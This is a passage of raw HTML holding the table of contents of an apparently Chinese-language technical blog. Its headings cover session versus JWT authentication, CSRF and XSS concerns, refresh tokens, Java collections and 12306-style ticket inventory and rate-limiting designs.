href="#%E2%9C%85-Token-%E5%8F%AF%E4%BB%A5%E9%98%B2-CSRF%EF%BC%88%E5%9B%A0%E4%B8%BA%E4%B8%8D%E8%87%AA%E5%8A%A8%E5%B8%A6%EF%BC%89"><span class="toc-text">✅ Token 可以防 CSRF（因为不自动带）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9D%8C-%E4%BD%86-Token-%E6%97%A0%E6%B3%95%E9%98%B2%E6%AD%A2-XSS%EF%BC%8C%E5%8E%9F%E5%9B%A0%E5%A6%82%E4%B8%8B%EF%BC%9A"><span class="toc-text">❌ 但 Token 无法防止 XSS，原因如下：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E4%B8%BE%E4%B8%AA%E5%AE%9E%E9%99%85%E4%BE%8B%E5%AD%90"><span class="toc-text">四、举个实际例子</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#jwt%E7%9A%84%E4%BC%98%E7%BC%BA%E7%82%B9"><span class="toc-text">jwt的优缺点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81JWT-%E6%98%AF%E2%80%9C%E8%87%AA%E5%8C%85%E5%90%AB%E2%80%9D%E7%9A%84"><span class="toc-text">一、JWT 是“自包含”的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%91%A8%F0%9F%92%BB-%E4%B8%BE%E4%B8%AA%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81%E7%9A%84%E5%AF%B9%E6%AF%94%E4%BE%8B%E5%AD%90%EF%BC%9A"><span class="toc-text">👨💻 举个登录认证的对比例子：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-%E4%BC%A0%E7%BB%9F-Session-%E8%AE%A4%E8%AF%81%EF%BC%9A"><span class="toc-text">✅ 传统 Session 认证：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-%E4%BD%BF%E7%94%A8-JWT-%E8%AE%A4%E8%AF%81%EF%BC%9A"><span class="toc-text">✅ 使用 JWT 认证：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%92-2-%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%EF%BC%9F%E6%9C%89%E5%93%AA%E4%BA%9B%E6%96%B9%E6%A1%88%EF%BC%9F"><span class="toc-text">🔒 2. 如何解决？有哪些方案？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-%E6%96%B9%E6%A1%88%E4%B8%80%EF%BC%9A%E8%AE%BE%E7%BD%AE%E7%9F%AD%E6%9C%89%E6%95%88%E6%9C%9F-%E5%88%B7%E6%96%B0%E6%9C%BA%E5%88%B6"><span class="toc-text">✅ 方案一：设置短有效期 + 刷新机制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-%E6%96%B9%E6%A1%88%E4%BA%8C%EF%BC%9A%E6%9C%8D%E5%8A%A1%E7%AB%AF%E7%BB%B4%E6%8A%A4%E9%BB%91%E5%90%8D%E5%8D%95%EF%BC%88Token-Blocklist%EF%BC%89"><span class="toc-text">✅ 方案二：服务端维护黑名单（Token Blocklist）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-%E6%96%B9%E6%A1%88%E4%B8%89%EF%BC%9A%E8%AE%B0%E5%BD%95-JWT-%E7%9A%84%E7%89%88%E6%9C%AC%E5%8F%B7%EF%BC%88%E4%BE%8B%E5%A6%82-tokenVersion-%EF%BC%89"><span class="toc-text">✅ 方案三：记录 JWT 的版本号（例如 tokenVersion****）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%80%BB%E7%BB%93%E4%B8%80%E5%8F%A5%E8%AF%9D%EF%BC%9A-3"><span class="toc-text">✅ 总结一句话：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E7%A7%BB%E5%8A%A8%E7%AB%AF%E6%9B%B4%E9%80%82%E5%90%88%E4%BD%BF%E7%94%A8-JWT-%E8%80%8C%E4%B8%8D%E6%98%AF-Session"><span class="toc-text">为什么移动端更适合使用 JWT 而不是 Session</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E7%8A%B6%E6%80%81%E7%AE%A1%E7%90%86%E5%B7%AE%E5%BC%82"><span class="toc-text">一、状态管理差异</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Session%EF%BC%88%E6%9C%89%E7%8A%B6%E6%80%81%EF%BC%89%EF%BC%9A"><span class="toc-text">Session（有状态）：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JWT%EF%BC%88%E6%97%A0%E7%8A%B6%E6%80%81%EF%BC%89%EF%BC%9A"><span class="toc-text">JWT（无状态）：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E8%B7%A8%E5%B9%B3%E5%8F%B0%E5%85%BC%E5%AE%B9%E6%80%A7"><span class="toc-text">二、跨平台兼容性</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Session-%E7%9A%84%E5%B1%80%E9%99%90%E6%80%A7%EF%BC%9A"><span class="toc-text">Session 的局限性：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JWT-%E7%9A%84%E4%BC%98%E5%8A%BF%EF%BC%9A"><span class="toc-text">JWT 的优势：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%AE%89%E5%85%A8%E6%80%A7%E8%A7%92%E5%BA%A6"><span class="toc-text">三、安全性角度</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Session-%E7%9A%84%E9%97%AE%E9%A2%98%EF%BC%9A"><span class="toc-text">Session 的问题：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JWT-%E7%9A%84%E4%BC%98%E5%8A%BF%EF%BC%9A-2"><span class="toc-text">JWT 的优势：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%80%E3%80%81%E4%B8%BA%E4%BB%80%E4%B9%88%E5%AE%83%E4%BB%AC%E5%AE%B9%E6%98%93%E6%B3%84%E9%9C%B2"><span class="toc-text">✅ 一、为什么它们容易泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%93-1-Session-ID-%E6%B3%84%E9%9C%B2%E7%9A%84%E5%B8%B8%E8%A7%81%E5%8E%9F%E5%9B%A0"><span class="toc-text">🔓 1. Session ID 泄露的常见原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%93-2-JWT-%E6%B3%84%E9%9C%B2%E7%9A%84%E5%B8%B8%E8%A7%81%E5%8E%9F%E5%9B%A0"><span class="toc-text">🔓 2. JWT 泄露的常见原因</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%9B%A1-%E4%B8%89%E3%80%81%E5%A6%82%E4%BD%95%E9%98%B2%E6%AD%A2%E6%B3%84%E9%9C%B2"><span class="toc-text">🛡 三、如何防止泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E5%AF%B9%E4%BA%8E-Session-ID%EF%BC%9A"><span class="toc-text">✅ 对于 Session ID：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E5%AF%B9%E4%BA%8E-JWT%EF%BC%9A"><span class="toc-text">✅ 对于 JWT：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JWT-%E7%9A%84%E7%BB%AD%E7%AD%BE%E9%97%AE%E9%A2%98"><span class="toc-text">JWT 的续签问题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E7%B1%BB%E4%BC%BC%E4%BA%8E-Session-%E8%AE%A4%E8%AF%81%E4%B8%AD%E7%9A%84%E5%81%9A%E6%B3%95%EF%BC%88%E4%B8%8D%E6%8E%A8%E8%8D%90%EF%BC%89"><span class="toc-text">1、类似于 Session 认证中的做法（不推荐）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%80%E3%80%81%E8%BF%99%E7%A7%8D%E6%96%B9%E6%A1%88%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B"><span class="toc-text">✅ 一、这种方案的基本流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%BA%8C%E3%80%81%E4%B8%BE%E4%B8%AA%E5%AE%9E%E9%99%85%E4%BE%8B%E5%AD%90"><span class="toc-text">✅ 二、举个实际例子</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E5%90%8E%EF%BC%9A"><span class="toc-text">登录后：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E6%98%8E%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="toc-text">小明操作过程：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9A%A0%EF%B8%8F-%E4%B8%89%E3%80%81%E8%BF%99%E7%A7%8D%E6%96%B9%E5%BC%8F%E7%9A%84%E9%97%AE%E9%A2%98%E7%82%B9"><span class="toc-text">⚠️ 三、这种方式的问题点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9D%8C-%E9%97%AE%E9%A2%98%E4%B8%80%EF%BC%9A%E8%A2%AB%E5%8A%A8%E7%BB%AD%E6%9C%9F%EF%BC%8C%E4%B8%8D%E5%8F%8A%E6%97%B6"><span class="toc-text">❌ 问题一：被动续期，不及时</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9D%8C-%E9%97%AE%E9%A2%98%E4%BA%8C%EF%BC%9A%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%80%BB%E8%BE%91%E5%A4%8D%E6%9D%82"><span class="toc-text">❌ 问题二：客户端逻辑复杂</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9D%8C-%E9%97%AE%E9%A2%98%E4%B8%89%EF%BC%9A%E4%BC%9A%E8%AF%9D%E6%8E%A7%E5%88%B6%E5%BC%B1"><span class="toc-text">❌ 问题三：会话控制弱</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E5%9B%9B%E3%80%81%E5%B8%B8%E8%A7%81%E7%9A%84%E4%BC%98%E5%8C%96%E6%96%B9%E5%BC%8F"><span class="toc-text">✅ 四、常见的优化方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%96%B9%E6%A1%88%E4%B8%80%EF%BC%9A%E5%BC%95%E5%85%A5-Refresh-Token"><span class="toc-text">✅ 方案一：引入 Refresh Token</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%9A"><span class="toc-text">使用方式：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%96%B9%E6%A1%88%E4%BA%8C%EF%BC%9ASliding-Session%EF%BC%88%E6%BB%91%E5%8A%A8%E4%BC%9A%E8%AF%9D%EF%BC%89"><span class="toc-text">✅ 方案二：Sliding Session（滑动会话）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-Refresh-Token-%E6%98%AF%E6%80%8E%E4%B9%88%E8%A7%A3%E5%86%B3%E8%BF%99%E4%BA%9B%E9%97%AE%E9%A2%98%E7%9A%84%EF%BC%9F"><span class="toc-text">✅ Refresh Token 是怎么解决这些问题的？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%90-1-%E7%94%A8%E6%88%B7%E7%99%BB%E5%87%BA%E6%97%B6%E5%88%A0%E9%99%A4-Refresh-Token"><span class="toc-text">🔐 1. 用户登出时删除 Refresh Token</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%9A%AB-2-%E5%B0%81%E7%A6%81%E8%B4%A6%E5%8F%B7%E6%97%B6%E4%BD%BF-Refresh-Token-%E5%A4%B1%E6%95%88"><span class="toc-text">🚫 2. 封禁账号时使 Refresh Token 失效</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%84-3-%E5%88%B7%E6%96%B0%E6%9C%BA%E5%88%B6%E9%80%9A%E8%BF%87-Refresh-Token-%E6%8E%A7%E5%88%B6-Access-Token-%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F"><span class="toc-text">🔄 3. 刷新机制通过 Refresh Token 控制 Access Token 生命周期</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%BE%E4%B8%AA%E5%AE%8C%E6%95%B4%E4%BE%8B%E5%AD%90%E6%9B%B4%E6%B8%85%E6%99%B0"><span class="toc-text">✅ 举个完整例子更清晰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%BD%A0%E8%AF%B4%E7%9A%84%E6%96%B9%E6%A1%88%EF%BC%9AJWT-%E5%AD%98%E5%85%A5-Redis%EF%BC%8C%E7%84%B6%E5%90%8E%E7%99%BB%E5%87%BA%E6%97%B6%E5%88%A0%E6%8E%89"><span class="toc-text">✅ 你说的方案：JWT 存入 Redis，然后登出时删掉</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B%E5%A6%82%E4%B8%8B%EF%BC%9A"><span class="toc-text">流程如下：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%8D-%E8%BF%99%E7%A7%8D%E6%96%B9%E6%A1%88%E6%9C%AC%E8%B4%A8%E4%B8%8A%E5%81%9A%E5%88%B0%E4%BA%86%E3%80%8C%E5%8F%AF%E6%8E%A7%E7%9A%84-JWT%E3%80%8D%EF%BC%8C%E4%B9%9F%E8%83%BD%E7%AB%8B%E5%8D%B3%E7%99%BB%E5%87%BA%E3%80%81%E7%A6%81%E7%94%A8-token%E3%80%82"><span class="toc-text">🔍 这种方案本质上做到了「可控的 JWT」，也能立即登出、禁用 token。</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9D%8C-%E4%BD%86%E9%97%AE%E9%A2%98%E4%B9%9F%E6%9D%A5%E4%BA%86%EF%BC%9A%E4%BD%A0%E7%94%A8-JWT%EF%BC%8C%E5%8D%B4%E7%89%BA%E7%89%B2%E4%BA%86-JWT-%E7%9A%84%E6%9C%80%E5%A4%A7%E4%BC%98%E5%8A%BF%E2%80%94%E2%80%94%E6%97%A0%E7%8A%B6%E6%80%81"><span class="toc-text">❌ 但问题也来了：你用 JWT，却牺牲了 JWT 的最大优势——无状态</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E6%AF%8F%E6%AC%A1%E8%AF%B7%E6%B1%82%E9%83%BD%E8%BF%94%E5%9B%9E%E6%96%B0-JWT%EF%BC%88%E4%B8%8D%E6%8E%A8%E8%8D%90%EF%BC%89"><span class="toc-text">2、每次请求都返回新 JWT（不推荐）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81JWT-%E6%9C%89%E6%95%88%E6%9C%9F%E8%AE%BE%E7%BD%AE%E5%88%B0%E5%8D%8A%E5%A4%9C%EF%BC%88%E4%B8%8D%E6%8E%A8%E8%8D%90%EF%BC%89"><span class="toc-text">3、JWT 有效期设置到半夜（不推荐）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E3%80%81%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E8%BF%94%E5%9B%9E%E4%B8%A4%E4%B8%AA-JWT%EF%BC%88%E6%8E%A8%E8%8D%90%EF%BC%89%EF%BC%88%E5%9C%A8%E6%96%B9%E6%A1%88%E4%B8%80%E4%B8%AD%E6%9C%89%E6%B6%89%E5%8F%8A%E5%88%B0%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%89"><span class="toc-text">4、用户登录返回两个 JWT（推荐）（在方案一中有涉及到相关知识点）</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">小林-spring</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">javaguide-java篇</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#java-util%E3%80%81java-util-concurrent%E5%8C%85%E7%9A%84%E9%9B%86%E5%90%88%E7%B1%BB%E5%92%8C%E6%8E%A5%E5%8F%A3"><span class="toc-text">java.util、java.util.concurrent包的集合类和接口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-ConcurrentHashMap-K-V"><span class="toc-text">1. ConcurrentHashMap&lt;K,V&gt;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-CopyOnWriteArrayList-E"><span class="toc-text">2. CopyOnWriteArrayList&lt;E&gt;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-1-ArrayList-%E7%9A%84%E9%BB%98%E8%AE%A4%E5%AE%B9%E9%87%8F%E9%98%88%E5%80%BC"><span class="toc-text">✅ 1. ArrayList 的默认容量阈值</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-2-%E9%93%BE%E8%A1%A8%EF%BC%88LinkedList%EF%BC%89%E6%97%A0%E5%AE%B9%E9%87%8F%E9%99%90%E5%88%B6"><span class="toc-text">✅ 2. 链表（LinkedList）无容量限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E9%9D%A2%E8%AF%95%E8%AF%9D%E6%9C%AF%E5%8F%82%E8%80%83"><span class="toc-text">✅ 面试话术参考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LinkedList-%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8D%E8%83%BD%E5%AE%9E%E7%8E%B0-RandomAccess-%E6%8E%A5%E5%8F%A3%EF%BC%9F"><span class="toc-text">LinkedList 为什么不能实现 RandomAccess 接口？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B7%B1%E6%8B%B7%E8%B4%9D%E6%B5%85%E6%8B%B7%E8%B4%9D"><span class="toc-text">深拷贝浅拷贝</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%B5%85%E6%8B%B7%E8%B4%9D%EF%BC%88Shallow-Copy%EF%BC%89"><span class="toc-text">✅ 浅拷贝（Shallow Copy）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%B7%B1%E6%8B%B7%E8%B4%9D%EF%BC%88Deep-Copy%EF%BC%89"><span class="toc-text">✅ 深拷贝（Deep Copy）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9B%86%E5%90%88%E4%B8%AD%E7%9A%84fail-fast%E5%92%8Cfail-safe"><span class="toc-text">集合中的fail-fast和fail-safe</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#javaguide%E4%B8%AD%E6%8F%8F%E8%BF%B0"><span class="toc-text">javaguide中描述</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#fail-fast"><span class="toc-text">fail-fast</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fail-safe"><span class="toc-text">fail-safe</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90"><span class="toc-text">详细解析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-text">✅ 一句话总结：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9D%97-fail-fast-%E5%8E%9F%E7%90%86%E7%AE%80%E8%BF%B0"><span class="toc-text">❗ fail-fast 原理简述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%9A%AB-%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8D%E8%83%BD%E8%BF%99%E6%A0%B7%E5%81%9A%EF%BC%9F"><span class="toc-text">🚫 为什么不能这样做？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sleep%E5%92%8Cwait%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-text">sleep和wait的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E7%A4%BA%E4%BE%8B%E8%83%8C%E6%99%AF%EF%BC%9A%E4%B8%A4%E4%B8%AA%E7%BA%BF%E7%A8%8B%E5%B0%9D%E8%AF%95%E8%8E%B7%E5%8F%96%E5%90%8C%E4%B8%80%E4%B8%AA%E9%94%81"><span class="toc-text">✅ 示例背景：两个线程尝试获取同一个锁</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java-%E5%B8%B8%E8%A7%81%E7%B1%BB%E4%B8%AD%E5%B7%B2%E9%87%8D%E5%86%99-toString-%E6%96%B9%E6%B3%95%E4%B8%80%E8%A7%88%E8%A1%A8"><span class="toc-text">Java 常见类中已重写 toString() 方法一览表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AF%94%E8%BE%83-HashSet%E3%80%81LinkedHashSet-%E5%92%8C-TreeSet-%E4%B8%89%E8%80%85%E7%9A%84%E5%BC%82%E5%90%8C"><span class="toc-text">比较 HashSet、LinkedHashSet 和 TreeSet 三者的异同</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ArrayDeque-%E4%B8%8E-LinkedList-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-text">ArrayDeque 与 LinkedList 的区别</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">12306</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E7%A7%8D%E5%B8%B8%E8%A7%81%E5%BA%93%E5%AD%98%E6%89%A3%E5%87%8F%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88%EF%BC%88%E9%98%B2%E6%AD%A2%E8%B6%85%E5%8D%96%EF%BC%89"><span class="toc-text">三种常见库存扣减技术方案（防止超卖）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%80%E3%80%81%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B9%90%E8%A7%82%E9%94%81%E6%96%B9%E6%A1%88"><span class="toc-text">✅ 一、数据库乐观锁方案</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%A9-%E9%80%82%E7%94%A8%E5%9C%BA%E6%99%AF%EF%BC%9A"><span class="toc-text">🧩 适用场景：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%81-%E6%B5%81%E7%A8%8B%E8%AF%B4%E6%98%8E%EF%BC%9A"><span class="toc-text">🔁 流程说明：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E4%BC%98%E7%82%B9%EF%BC%9A-3"><span class="toc-text">✅ 优点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9D%8C-%E7%BC%BA%E7%82%B9%EF%BC%9A-5"><span class="toc-text">❌ 缺点：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%BA%8C%E3%80%81Redis-%E7%BC%93%E5%AD%98%E6%89%A3%E5%87%8F%E6%96%B9%E6%A1%88"><span class="toc-text">✅ 二、Redis 缓存扣减方案</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%A9-%E9%80%82%E7%94%A8%E5%9C%BA%E6%99%AF%EF%BC%9A-2"><span class="toc-text">🧩 适用场景：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%81-%E6%B5%81%E7%A8%8B%E8%AF%B4%E6%98%8E%EF%BC%9A-2"><span class="toc-text">🔁 流程说明：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E4%BC%98%E7%82%B9%EF%BC%9A-4"><span class="toc-text">✅ 优点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9D%8C-%E7%BC%BA%E7%82%B9%EF%BC%9A-6"><span class="toc-text">❌ 缺点：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%89%E3%80%8112306-%E8%87%AA%E7%A0%94%E9%AB%98%E5%B9%B6%E5%8F%91%E4%BD%99%E7%A5%A8%E6%96%B9%E6%A1%88"><span class="toc-text">✅ 三、12306 自研高并发余票方案</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%A9-%E9%80%82%E7%94%A8%E5%9C%BA%E6%99%AF%EF%BC%9A-3"><span class="toc-text">🧩 适用场景：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%8E%AF-%E7%89%B9%E6%AE%8A%E4%B9%8B%E5%A4%84%EF%BC%9A"><span class="toc-text">🎯 特殊之处：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%81-%E6%B5%81%E7%A8%8B%E8%AF%B4%E6%98%8E%EF%BC%9A-3"><span class="toc-text">🔁 流程说明：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E4%BC%98%E7%82%B9%EF%BC%9A-5"><span class="toc-text">✅ 优点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9D%8C-%E7%BC%BA%E7%82%B9%EF%BC%9A-7"><span class="toc-text">❌ 缺点：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%89%E3%80%8112306-%E9%AB%98%E5%B9%B6%E5%8F%91%E4%BD%99%E7%A5%A8%E6%96%B9%E6%A1%88%EF%BC%88%F0%9F%9A%84%E4%B8%93%E5%B1%9E%EF%BC%89"><span class="toc-text">✅ 三、12306 高并发余票方案（🚄专属）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E8%83%8C%E6%99%AF%E7%89%B9%E6%AE%8A%E6%80%A7%EF%BC%9A"><span class="toc-text">✅ 背景特殊性：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%88Redis%E4%B8%AD%EF%BC%89%EF%BC%9A"><span class="toc-text">✅ 数据结构（Redis中）：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E7%A4%BA%E4%BE%8B%E6%B5%81%E7%A8%8B%EF%BC%9A"><span class="toc-text">✅ 示例流程：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E4%BC%98%E5%8A%BF%EF%BC%9A"><span class="toc-text">✅ 优势：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A4%E7%89%8C%E9%99%90%E6%B5%81%E5%92%8C%E4%BB%A4%E7%89%8C%E6%A1%B6%E9%99%90%E6%B5%81"><span class="toc-text">令牌限流和令牌桶限流</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%BD%A0%E8%AF%B4%E7%9A%84%E2%80%9C%E4%BB%A4%E7%89%8C%E9%99%90%E6%B5%81%E2%80%9D%EF%BC%9A%E5%85%B6%E5%AE%9E%E6%98%AF-%E2%80%9C%E5%BA%93%E5%AD%98%E4%BB%A4%E7%89%8C%E6%8E%A7%E5%88%B6%E2%80%9D"><span class="toc-text">✅ 你说的“令牌限流”：其实是 “库存令牌控制”</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-Token-Bucket%EF%BC%88%E4%BB%A4%E7%89%8C%E6%A1%B6%EF%BC%89%E7%AE%97%E6%B3%95%E5%88%99%E6%98%AF-%E2%80%9C%E9%80%9F%E7%8E%87%E6%8E%A7%E5%88%B6%E5%9E%8B%E9%99%90%E6%B5%81%E2%80%9D"><span class="toc-text">✅ Token Bucket（令牌桶）算法则是 “速率控制型限流”</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C%E6%9C%BA%E5%88%B6%EF%BC%9A"><span class="toc-text">工作机制：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%E5%9C%BA%E6%99%AF%EF%BC%9A"><span class="toc-text">示例场景：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E6%80%BB%E7%BB%93%E4%B8%80%E5%8F%A5%E8%AF%9D%EF%BC%9A-4"><span class="toc-text">✅ 总结一句话：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 